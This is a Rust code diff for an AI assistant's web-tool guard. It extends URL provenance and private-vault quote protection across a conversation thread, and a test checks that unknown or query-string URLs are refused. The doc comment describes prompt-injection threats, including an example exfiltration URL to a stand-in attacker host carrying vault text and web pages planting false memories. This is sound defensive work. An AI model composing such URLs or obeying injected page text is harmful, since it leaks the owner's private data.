@@ -1,22 +1,23 @@
-//! KI-81: what one turn's web tools may do, given what came into the turn.
+//! KI-81: what web tools may do, with provenance retained for the thread.
 //!
 //! Fetched pages and search snippets are strangers' text. The prompt says
 //! they are never instructions, but that's a soft guard, so the tools hold
 //! three hard ones:
 //!
 //! - **Provenance.** `web_fetch` opens a URL only if it appeared in
-//!   Hussain's own messages, in what Kin read from the vault or the Feed this
-//!   turn, or in this turn's search results; or it's a link on a page Kin
+//!   Hussain's own messages, in what Kin read from the vault or the Feed in
+//!   this thread, or in this thread's search results; or it's a link on a page Kin
 //!   already fetched, on the same site and without a query string. A URL
 //!   Kin composed itself (`https://attacker.example/?q=<vault text>`) has
 //!   none of these, so nothing from the vault rides out in it.
 //! - **Queries.** `web_search` queries are at most [`MAX_QUERY_CHARS`] and
 //!   may not quote [`QUOTE_WORDS`] or more words in a row of what Kin read
-//!   from the vault this turn, unless Hussain wrote those words himself.
+//!   from the vault in this thread, unless Hussain wrote those words himself.
 //! - **Taint.** Once web text is in the turn, Kin's memory and skills are
 //!   read-only until his next message, so a page can't plant lasting
 //!   "facts" about him.
 
+use serde::{Deserialize, Serialize};
 use std::collections::HashSet;
 use std::hash::{DefaultHasher, Hash, Hasher};
 
@@ -28,23 +29,34 @@ pub const QUOTE_WORDS: usize = 8;
 pub const QUERY_TOO_LONG: &str =
     "That query is too long: keep web searches under 200 characters, in your own words.";
 pub const QUERY_QUOTES_VAULT: &str = "That query quotes the vault word for word, and searches leave the Mac. Search in your own words, without private details.";
-pub const NO_PROVENANCE: &str = "web_fetch only opens links from this turn: in Hussain's messages, in what you read from the vault or Feed, in search results, or on a page you read (same site, no query string). Tell him: I can only open links you gave me or that came up in a search.";
+pub const NO_PROVENANCE: &str = "web_fetch only opens links from this thread: in Hussain's messages, in what you read from the vault or Feed, in search results, or on a page you read (same site, no query string). Tell him: I can only open links you gave me or that came up in a search.";
 pub const MEMORY_LOCKED: &str = "Memory and skills are read-only for the rest of this turn because it read the web. If something is worth keeping, say so; Hussain can ask you to remember it in his next message.";
 
-/// One turn's provenance and taint.
-#[derive(Default)]
+/// Thread-scoped provenance and query protection, with a turn-scoped taint.
+#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
 pub struct Guard {
     /// URLs with provenance, as [`key`]s.
     known: HashSet<String>,
-    /// Hashed word runs of what Kin read from the vault this turn.
+    /// Hashed word runs of what Kin read from the vault in this thread.
     read: HashSet<u64>,
     /// Hashed word runs of Hussain's own messages: quoting him is fine.
     heard: HashSet<u64>,
     /// Web text came into the turn.
+    #[serde(skip)]
     tainted: bool,
 }
 
 impl Guard {
+    /// Carry provenance and private-quote protection across the thread, not
+    /// the previous turn's write lock. This is restored only at turn start.
+    pub fn restore(&mut self, previous: &Guard) {
+        self.known.extend(previous.known.iter().cloned());
+        self.read.extend(previous.read.iter().copied());
+        self.heard.extend(previous.heard.iter().copied());
+        // Retained web results are untrusted too. The write lock deliberately
+        // resets on the owner's next message, as KI-81 requires.
+    }
+
     /// Hussain's own words: his links (bare `example.com/post` too) and the
     /// phrases he may want searched as written.
     pub fn heard(&mut self, text: &str) {
@@ -238,6 +250,48 @@ mod tests {
 
     fn url(s: &str) -> reqwest::Url {
         reqwest::Url::parse(s).unwrap()
+    }
+
+    #[test]
+    fn thread_provenance_survives_turns_and_restart_without_widening_the_guard() {
+        let mut first = Guard::default();
+        first.read("Private words about the kiln must never leave this vault. https://vault.example/source");
+        first.searched(["https://search.example/result?q=original"]);
+        let page = url("https://page.example/start");
+        first.fetched(
+            &page,
+            page.as_str(),
+            "[next](/next) [unsafe](/next?q=private) [outside](https://elsewhere.example/a)",
+        );
+        assert!(first.tainted());
+        let restored: Guard =
+            serde_json::from_str(&serde_json::to_string(&first).unwrap()).unwrap();
+        let mut second = Guard::default();
+        second.restore(&restored);
+        assert!(
+            !second.tainted(),
+            "the owner's next message releases the write lock"
+        );
+        for allowed in [
+            "https://vault.example/source",
+            "https://search.example/result?q=original",
+            "https://page.example/next",
+        ] {
+            assert!(second.may_fetch(&url(allowed)).is_ok());
+        }
+        for refused in [
+            "https://elsewhere.example/a",
+            "https://page.example/next?q=private",
+            "https://vault.example/source?q=private",
+        ] {
+            assert_eq!(second.may_fetch(&url(refused)), Err(NO_PROVENANCE));
+        }
+        assert_eq!(
+            second.may_search("Private words about the kiln must never leave this vault"),
+            Err(QUERY_QUOTES_VAULT)
+        );
+        second.searched(["https://fresh.example/a"]);
+        assert!(second.tainted(), "a new web read locks writes again");
     }
 
     #[test]
